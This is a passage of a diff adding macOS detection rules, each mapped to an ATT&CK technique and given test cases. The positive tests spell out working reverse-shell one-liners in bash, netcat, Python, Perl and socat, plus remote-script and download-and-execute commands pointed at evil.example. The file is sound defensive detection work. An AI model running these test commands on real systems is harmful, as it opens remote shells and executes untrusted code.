+   "tactic": "Persistence",
+   "technique": "T1543.001",
+   "technique_name": "Create or Modify System Process: Launch Agent",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "\\b(cp|mv|ditto|install)\\b[^|;]*\\.plist\\s+\\S*/library/launch(agents|daemons)/"
+   },
+   "tags": [
+    "macos",
+    "launchd"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/cp",
+      "command": "cp /tmp/a.plist /Library/LaunchDaemons/com.a.plist"
+     },
+     {
+      "executable": "/bin/cp",
+      "command": "cp x.plist ~/Library/LaunchAgents/"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/cp",
+      "command": "cp a.plist ~/Library/Preferences/"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-launchctl-load-temp-plist",
+   "name": "launchctl loads a job from a temp or hidden path",
+   "description": "launchctl load/bootstrap pointed at a plist in a world-writable or hidden location.",
+   "tactic": "Persistence",
+   "technique": "T1543.001",
+   "technique_name": "Create or Modify System Process: Launch Agent",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/launchctl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(load|bootstrap|enable|kickstart)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/tmp/|/var/tmp/|/users/shared/|/\\.[a-z0-9_]+/)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "launchd"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl load -w /private/tmp/com.x.plist"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl load -w /Library/LaunchDaemons/com.docker.vmnetd.plist"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-launchctl-submit",
+   "name": "launchctl submit used",
+   "description": "launchctl submit registers an ad-hoc job without a plist file, leaving little on disk.",
+   "tactic": "Persistence",
+   "technique": "T1543.001",
+   "technique_name": "Create or Modify System Process: Launch Agent",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/launchctl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bsubmit\\s+-l\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "launchd"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl submit -l com.x -- /bin/sh -c id"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl list"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-launchctl-setenv-dyld",
+   "name": "launchctl exports a DYLD variable",
+   "description": "launchctl setenv DYLD_* makes every launched process load attacker libraries.",
+   "tactic": "Persistence",
+   "technique": "T1574.006",
+   "technique_name": "Hijack Execution Flow: Dynamic Linker Hijacking",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/launchctl"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "setenv"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "dyld_"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "dyld"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl setenv DYLD_INSERT_LIBRARIES /tmp/a.dylib"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl setenv PATH /usr/bin"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-dyld-insert-libraries",
+   "name": "DYLD_INSERT_LIBRARIES set on a command",
+   "description": "A command sets DYLD_INSERT_LIBRARIES to inject a dylib.",
+   "tactic": "Defense Evasion",
+   "technique": "T1574.006",
+   "technique_name": "Hijack Execution Flow: Dynamic Linker Hijacking",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "dyld_insert_libraries=\\S+"
+   },
+   "tags": [
+    "macos",
+    "dyld"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/env",
+      "command": "env DYLD_INSERT_LIBRARIES=/tmp/a.dylib /bin/ls"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/env",
+      "command": "env DYLD_PRINT_LIBRARIES=1 ./app"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-dyld-path-hijack-temp",
+   "name": "DYLD library or framework path set to a temp dir",
+   "description": "DYLD_LIBRARY_PATH or DYLD_FRAMEWORK_PATH points into world-writable storage.",
+   "tactic": "Defense Evasion",
+   "technique": "T1574.006",
+   "technique_name": "Hijack Execution Flow: Dynamic Linker Hijacking",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "dyld_(library|framework|fallback_library|fallback_framework)_path=\\S*(/tmp/|/var/tmp/|/users/shared/)"
+   },
+   "tags": [
+    "macos",
+    "dyld"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/env",
+      "command": "env DYLD_FRAMEWORK_PATH=/private/tmp/f ./app"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/env",
+      "command": "env DYLD_LIBRARY_PATH=/opt/homebrew/lib ./app"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-kext-load-command",
+   "name": "Kernel extension loaded from the shell",
+   "description": "kextload or kmutil load-extension is run.",
+   "tactic": "Persistence",
+   "technique": "T1547.006",
+   "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/kextload"
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "suffix",
+        "pattern": "/kmutil"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\b(load|load-extension|install)\\b"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "kext"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/sbin/kextload",
+      "command": "kextload /tmp/x.kext"
+     },
+     {
+      "executable": "/usr/bin/kmutil",
+      "command": "kmutil load -p /Library/Extensions/x.kext"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/kmutil",
+      "command": "kmutil showloaded"
+     },
+     {
+      "executable": "/usr/sbin/kextstat",
+      "command": "kextstat"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-systemextensionsctl-tamper",
+   "name": "System extension developer mode or uninstall",
+   "description": "systemextensionsctl developer on or uninstall, which relaxes signing or removes security extensions.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "Impair Defenses: Disable or Modify Tools",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/systemextensionsctl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bdeveloper\\s+on\\b|\\buninstall\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "sysext"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/systemextensionsctl",
+      "command": "systemextensionsctl developer on"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/systemextensionsctl",
+      "command": "systemextensionsctl list"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-bash-command-substitution-curl",
+   "name": "bash -c with curl command substitution",
+   "description": "bash -c \"$(curl ...)\" executes a remote script, as ClickFix-style lures instruct.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Command and Scripting Interpreter: Unix Shell",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(ba|z)?sh\\s+-c\\s+[\\\"']?\\$\\((curl|wget)\\b"
+     },
+     {
+      "not": {
+       "field": "command",
+       "op": "contains",
+       "patterns": [
+        "homebrew/install",
+        "ohmyzsh"
+       ]
+      }
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "curl"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c \"$(curl -fsSL http://evil.example/i.sh)\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\""
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-curl-download-to-temp-exec",
+   "name": "Download to temp followed by execution",
+   "description": "A single command line downloads into /tmp and chmods or runs it.",
+   "tactic": "Command and Control",
+   "technique": "T1105",
+   "technique_name": "Ingress Tool Transfer",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(curl|wget)\\b[^;|&]*(-o|--output|-p)\\s*\\S*(/tmp/|/var/tmp/|/users/shared/)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(;|&&)\\s*(chmod\\s+\\+x|sh\\s|bash\\s|/)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "curl"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'curl -s http://1.2.3.4/a -o /tmp/a && chmod +x /tmp/a && /tmp/a'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s http://example.com/a -o /tmp/a"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-base64-decode-to-shell",
+   "name": "Base64 payload decoded into a shell",
+   "description": "base64 -D/-d output is piped into a shell or osascript.",
+   "tactic": "Defense Evasion",
+   "technique": "T1027",
+   "technique_name": "Obfuscated Files or Information",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "base64\\s+(-d|-D|--decode)\\b[^|]*\\|\\s*(sudo\\s+)?((/bin/)?(ba|z)?sh\\b|osascript)"
+   },
+   "tags": [
+    "macos",
+    "obfuscation"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'echo ZWNobyBoaQ== | base64 -D | sh'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'echo aGk= | base64 -D'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-chmod-exec-in-temp",
+   "name": "Execute bit set on a file in temp",
+   "description": "chmod +x (or 755) on a file under /tmp, /var/tmp or /Users/Shared.",
+   "tactic": "Defense Evasion",
+   "technique": "T1222.002",
+   "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/chmod"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\+x\\b|\\s[0-7]?[0-7][57][57]\\s"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/tmp/|/var/tmp/|/users/shared/)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "permissions"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/chmod",
+      "command": "chmod +x /private/tmp/agent"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/chmod",
+      "command": "chmod +x ./build.sh"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-exec-from-temp-dir",
+   "name": "Binary executed from a world-writable directory",
+   "description": "A process image runs from /tmp, /var/tmp or /Users/Shared.",
+   "tactic": "Execution",
+   "technique": "T1204.002",
+   "technique_name": "User Execution: Malicious File",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "executable",
+    "op": "regex",
+    "pattern": "^/(private/)?(tmp|var/tmp)/[^/]+$|^/users/shared/[^/]+$"
+   },
+   "tags": [
+    "macos",
+    "staging"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/private/tmp/agent",
+      "command": "/private/tmp/agent"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/ls",
+      "command": "ls /tmp"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-exec-hidden-in-temp",
+   "name": "Hidden binary executed from temp",
+   "description": "The running image is a dot-prefixed file under temp directories.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.001",
+   "technique_name": "Hide Artifacts: Hidden Files and Directories",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "executable",
+    "op": "regex",
+    "pattern": "^/(private/)?(tmp|var/tmp)/(.*/)?\\.[^/.][^/]*$|^/users/shared/(.*/)?\\.[^/.][^/]*$"
+   },
+   "tags": [
+    "macos",
+    "hiding"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/private/tmp/.hidden",
+      "command": "/private/tmp/.hidden"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/private/tmp/visible",
+      "command": "x"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-exec-from-app-support-hidden",
+   "name": "Process runs from a hidden Application Support directory",
+   "description": "The executable lives in a dot-directory below Library/Application Support or Library/Caches.",
+   "tactic": "Defense Evasion",
+   "technique": "T1036.005",
+   "technique_name": "Masquerading: Match Legitimate Name or Location",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "executable",
+    "op": "regex",
+    "pattern": "/library/(application support|caches)/\\.[^/]+/"
+   },
+   "tags": [
+    "macos",
+    "hiding"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/Users/ann/Library/Application Support/.cfg/agent",
+      "command": "agent"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/Users/ann/Library/Application Support/Code/helper",
+      "command": "helper"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-codesign-adhoc-temp",
+   "name": "Ad-hoc signing of a binary in temp or shared storage",
+   "description": "codesign -s - applies an ad-hoc signature to a payload in temp, needed to run unsigned binaries on Apple silicon.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.002",
+   "technique_name": "Subvert Trust Controls: Code Signing",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/codesign"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-s|--sign)\\s+-(\\s|$)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/tmp/|/var/tmp/|/users/shared/)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "codesign"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/codesign",
+      "command": "codesign --force -s - /private/tmp/agent"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/codesign",
+      "command": "codesign -dv /Applications/Safari.app"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-codesign-remove-signature",
+   "name": "Code signature stripped",
+   "description": "codesign --remove-signature on a binary.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.002",
+   "technique_name": "Subvert Trust Controls: Code Signing",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/codesign"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "--remove-signature"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "codesign"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/codesign",
+      "command": "codesign --remove-signature /tmp/a"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/codesign",
+      "command": "codesign -v /tmp/a"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-installer-pkg-silent-temp",
+   "name": "Package installed silently from temp",
+   "description": "installer -pkg from /tmp or Users/Shared targeting the root volume.",
+   "tactic": "Execution",
+   "technique": "T1204.002",
+   "technique_name": "User Execution: Malicious File",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/installer"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-pkg\\s+\\S*(/tmp/|/var/tmp/|/users/shared/)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-target\\s+/(\\s|$)"
+     },
+     {
+      "not": {
+       "field": "command",
+       "op": "regex",
+       "pattern": "-pkg\\s+\\S*(chrome|firefox|zoom|slack|docker|node|python|xcode|microsoft|office|teams|vscode|dropbox|1password|jamf|crowdstrike|falcon|adobe)[^/\\s]*\\.pkg"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "pkg"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/installer",
+      "command": "installer -pkg /private/tmp/u.pkg -target /"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/installer",
+      "command": "installer -pkg /Users/ann/Downloads/u.pkg -target /"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-hdiutil-attach-quiet-temp",
+   "name": "Disk image mounted silently from temp",
+   "description": "hdiutil attach with -nobrowse on an image in a temp path; loaders mount payload images this way.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.005",
+   "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/hdiutil"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "attach"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "-nobrowse"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/tmp/|/var/tmp/|/users/shared/)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "dmg"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/hdiutil",
+      "command": "hdiutil attach -nobrowse -quiet /private/tmp/a.dmg"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/hdiutil",
+      "command": "hdiutil attach ~/Downloads/a.dmg"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-reverse-shell-dev-tcp",
+   "name": "Bash /dev/tcp reverse shell",
+   "description": "A shell redirects its stdio to /dev/tcp.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Command and Scripting Interpreter: Unix Shell",
+   "severity": "critical",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(bash|sh|zsh)\\s+-i\\b.*[<>&]+\\s*/dev/tcp/|exec\\s+\\d+<>/dev/tcp/"
+   },
+   "tags": [
+    "macos",
+    "reverse-shell"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -i"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-reverse-shell-netcat-exec",
+   "name": "Netcat with shell execution",
+   "description": "nc or ncat started with -e or -c to attach a shell.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Command and Scripting Interpreter: Unix Shell",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/(nc|ncat|netcat)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-[a-z]*[ec]\\s+\\S*(sh|zsh|bash)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "reverse-shell"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/nc",
+      "command": "nc -e /bin/sh 10.0.0.5 4444"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/nc",
+      "command": "nc -zv host 22"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-reverse-shell-mkfifo-nc",
+   "name": "mkfifo shell relay",
+   "description": "A named pipe connects a shell to netcat.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Command and Scripting Interpreter: Unix Shell",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "mkfifo"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(nc|ncat|netcat)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(sh|bash|zsh)\\s+-i"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "reverse-shell"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 4444 > /tmp/f'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/mkfifo",
+      "command": "mkfifo /tmp/pipe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-reverse-shell-python-socket",
+   "name": "Python socket-based shell",
+   "description": "A one-liner imports socket, dup2s onto it and spawns a shell.",
+   "tactic": "Execution",
+   "technique": "T1059.006",
+   "technique_name": "Command and Scripting Interpreter: Python",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "python[0-9.]*\\s+-c"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "socket"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "dup2",
+       "pty.spawn"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "reverse-shell"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"1.2.3.4\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 -c 'import socket; print(socket.gethostname())'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-reverse-shell-scripting-lang",
+   "name": "Perl, Ruby or PHP socket shell",
+   "description": "A one-liner in perl, ruby or php opens a socket and execs a shell.",
+   "tactic": "Execution",
+   "technique": "T1059",
+   "technique_name": "Command and Scripting Interpreter",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(perl|ruby|php)\\s+-[a-z]*[er]\\s"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "socket",
+       "tcpsocket",
+       "fsockopen"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "/bin/sh",
+       "/bin/bash",
+       "exec"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "reverse-shell"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/perl",
+      "command": "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);exec(\"/bin/sh -i\");'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/ruby",
+      "command": "ruby -e 'puts 1'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-reverse-shell-socat-openssl",
+   "name": "socat or openssl shell relay",
+   "description": "socat exec/pty with tcp or openssl s_client piped into a shell.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "technique_name": "Command and Scripting Interpreter: Unix Shell",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "suffix",
+        "pattern": "/socat"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "exec:.*(sh|bash|zsh)"
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "tcp"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "openssl s_client"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\|\\s*(/bin/)?(sh|bash|zsh)\\b"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "reverse-shell"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/socat",
+      "command": "socat exec:'bash -li',pty,stderr tcp:10.0.0.5:4444"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/socat",
+      "command": "socat -u tcp-listen:8080 -"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-ssh-reverse-tunnel",
+   "name": "SSH reverse tunnel",
+   "description": "ssh -R with -N establishes a persistent inbound tunnel to an external host.",
+   "tactic": "Command and Control",
+   "technique": "T1572",
+   "technique_name": "Protocol Tunneling",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/ssh"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-[a-z]*R\\s*\\d+:"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-[a-z]*N"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "tunnel"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -N -R 2222:localhost:22 user@vps.example.net"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -L 8080:localhost:80 user@host"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-miner-binary-name",
+   "name": "Known miner binary name",
+   "description": "A process image named after common miners (xmrig, xmr-stak, cpuminer, minerd).",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "technique_name": "Resource Hijacking",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "executable",
+    "op": "regex",
+    "pattern": "/(xmrig|xmr-stak|cpuminer|minerd|nheqminer|ethminer|cgminer|bfgminer|t-rex|nbminer)(-[a-z0-9.]+)?$"
+   },
+   "tags": [
+    "macos",
+    "miner"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/private/tmp/xmrig",
+      "command": "./xmrig"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/xmllint",
+      "command": "xmllint a.xml"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-miner-command-line",
+   "name": "Mining pool or wallet on a command line",
+   "description": "A command line has a stratum URL or typical miner flags.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "technique_name": "Resource Hijacking",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "stratum\\+(tcp|ssl|tls)://"
+     },
+     {
+      "all": [
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "--donate-level"
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "-o "
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\s-a\\s+(randomx|cryptonight|rx/0|ethash|kawpow)"
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "-u "
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "miner"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/tmp/a",
+      "command": "./a -o stratum+tcp://pool.example:3333 -u 4Abc"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl https://example.com/stratum-notes"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-miner-pool-destination",
+   "name": "Connection to a mining pool",
+   "description": "A connection to a well-known public mining pool host.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "technique_name": "Resource Hijacking",
+   "severity": "high",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
